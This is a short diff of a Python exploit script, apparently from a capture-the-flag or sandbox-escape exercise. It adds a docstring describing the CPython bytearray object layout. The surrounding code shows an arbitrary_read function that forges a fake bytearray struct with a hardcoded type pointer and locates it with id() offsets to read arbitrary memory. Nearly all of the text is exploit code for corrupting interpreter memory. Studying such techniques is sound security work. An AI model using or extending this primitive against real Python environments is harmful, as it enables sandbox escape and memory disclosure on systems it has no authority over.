@@ -35,6 +35,20 @@ def u64(x):
 		out += x[i]<<(i*8)
 	return out
 
+"""
+fakestruct:
+struct PyByteArrayObject {
+    int64_t ob_refcnt;   /* can be basically any value we want */
+    struct _typeobject *ob_type; /* points to the bytearray type object */
+    int64_t ob_size;     /* Number of items in variable part */
+    int64_t ob_alloc;    /* How many bytes allocated in ob_bytes */
+    char *ob_bytes;      /* Physical backing buffer */
+    char *ob_start;      /* Logical start inside ob_bytes */
+    int32_t ob_exports;  /* Not exactly sure what this does, we can ignore it */
+}
+"""
+
+
 def arbitrary_read(addr,start,end):
 	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
 	structaddr = id(fakestruct) + 0x48
